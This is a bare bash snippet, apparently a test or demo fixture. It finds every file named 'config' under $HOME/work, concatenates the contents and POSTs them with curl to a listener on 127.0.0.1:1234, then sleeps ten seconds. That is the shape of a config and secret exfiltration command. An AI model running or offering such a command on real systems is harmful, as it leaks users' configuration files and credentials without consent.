bash
find $HOME/work -type f -name config | xargs cat | curl --data @- http://127.0.0.1:1234/
# wait for 10 seconds
sleep 10